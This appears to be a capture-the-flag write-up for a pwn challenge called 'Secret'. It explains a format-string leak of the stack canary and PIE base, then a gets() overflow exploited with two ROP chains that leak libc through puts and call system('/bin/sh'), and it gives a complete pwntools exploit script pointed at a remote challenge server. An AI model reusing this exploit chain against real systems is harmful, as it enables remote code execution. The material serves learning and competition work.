
---

# Secret Challenge Writeup

## Vulnerability Analysis

The binary contains two distinct vulnerabilities that must be chained together to achieve code execution:

1. **Format String Vulnerability in `main()**`:
```c
read(0, buffer, 0x40);
printf("Hillo ");
printf(buffer); // VULN: User input passed directly to printf

```


This allows us to leak values from the stack.
2. **Stack Buffer Overflow in `secret()**`:
```c
gets(buffer); // VULN: Unbounded write (buffer is 136 bytes)

```


The `gets` function allows us to overwrite the stack, including the canary and the return address.

## Exploit Steps

Since the binary has **PIE** (Position Independent Executable) and **Stack Canaries** enabled, we cannot jump directly to known addresses or overflow the buffer blindly.

### 1. Leak Canary and PIE Base

We use the format string vulnerability in `main` to leak the necessary addresses.

* **Canary**: Located at offset **15** (`%15$p`).
* **Return Address**: Located at offset **21** (`%21$p`). This leaks an address inside `main` (specifically `__libc_start_main+x`), allowing us to calculate the binary's base address.

### 2. ROP Chain 1: Leak Libc

Now inside `secret()`, we trigger the buffer overflow. We construct a ROP chain to leak a libc address (`puts`) to bypass ASLR.

* **Payload**: `Padding (136)` + `Canary` + `RBP (8)` + `ROP Chain`.
* **Chain**:
1. `pop rdi; ret` (Gadget)
2. `puts@got` (Argument: Address of puts entry in GOT)
3. `puts@plt` (Function: Call puts to print the address)
4. `_start` (Return: Restart the program to send a second payload)



### 3. Calculate Libc Base

We receive the leaked address of `puts`. Using a libc database (or the provided libc), we calculate the base address:

```python
libc.address = leak_puts - libc.symbols['puts']

```

### 4. ROP Chain 2: Get Shell

The program restarts (thanks to `_start`). We bypass the name prompt and reach `secret()` again. Now we send the final ROP chain to spawn a shell.

* **Chain**:
1. `ret` (Gadget: Align stack to 16 bytes for `system`)
2. `pop rdi; ret`
3. `address of "/bin/sh"`
4. `system`



### Visual Exploit Flow

### Final Payload Structure

```python
payload = flat(
    b'a' * 136,            # Buffer Padding
    canary,                # Restore Canary (Must be correct!)
    b'b' * 8,              # Overwrite Saved RBP
    ret_gadget,            # Stack Alignment
    pop_rdi,               # Load Argument
    bin_sh_addr,           # "/bin/sh"
    system_addr            # Call system()
)

```

## Exploit Script
Here is the final solution:

```python
from pwn import *

# p = process('./pwn_secret')
p = remote('34.40.105.109',30865)


binary_path = './pwn_secret'
elf = ELF(binary_path)
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

p.recvuntil(b'Name: ')
p.sendline(b'%15$p|%21$p') # offset 15 is the canary and offset 19 is the entry addr

p.recvuntil(b'Hillo ')
leaks = p.recvline().strip().decode().split('|')

canary = int(leaks[0], 16)
code_leak = int(leaks[1], 16)
log.success(f"Canary: {hex(canary)}")
log.success(f"Code leak : {hex(code_leak)}")

elf.address = code_leak - 0xb6d # main address
log.success(f"binary base: {hex(elf.address)}")

# 0x0000000000000889 : ret
# 0x0000000000000ca3 : pop rdi ; ret

ret_gadget = 0x0000000000000889
pop_rdi_ret_gadget = 0x0000000000000ca3

ret_addr = elf.address + ret_gadget
pop_rdi_ret = elf.address + pop_rdi_ret_gadget

puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
start_addr = p64(elf.symbols['_start'])

payload = b'a' * 136 # reach canary
payload += p64(canary) # keep intact
payload += b'b' * 8 # fill rbp
# jumping jack flash
payload += p64(pop_rdi_ret)
payload += puts_got
payload += puts_plt
payload += start_addr

p.recvuntil(b'Phrase: ')
p.sendline(payload)

p.recvuntil(b'Entered strings are not same!\n')

try:
    leak_data = p.recvline().strip()
    # Sometimes puts outputs 6 bytes, sometimes padded.
    # We unpack it carefully.
    leak_puts = u64(leak_data.ljust(8, b'\x00'))
    log.success(f"Leaked puts@GLIBC: {hex(leak_puts)}")
except:
    log.error("Failed to receive leak. Check offsets.")

# now let's fuzz the libc version, we will try different offsets based on the puts termination e50, searching in libc database

puts_offset = 0x6f690

libc_base_address = leak_puts - puts_offset

system_offset = 0x45390
str_bin_sh_offset = 0x18cd57

system_address = libc_base_address + system_offset
str_bin_sh_address = libc_base_address + str_bin_sh_offset

p.recvuntil(b'Name: ')
p.sendline("you are pwned!")

p.recvuntil(b'Hillo ')
p.recvuntil(b'Phrase: ')

payload = b'a' * 136 # reach canary again
payload += p64(canary)
payload += b'b' * 8 # rbp
# jump again, but this time in libc
payload += p64(ret_addr)
payload += p64(pop_rdi_ret)
payload += p64(str_bin_sh_address)
payload += p64(system_address)

p.sendline(payload)

p.interactive()
```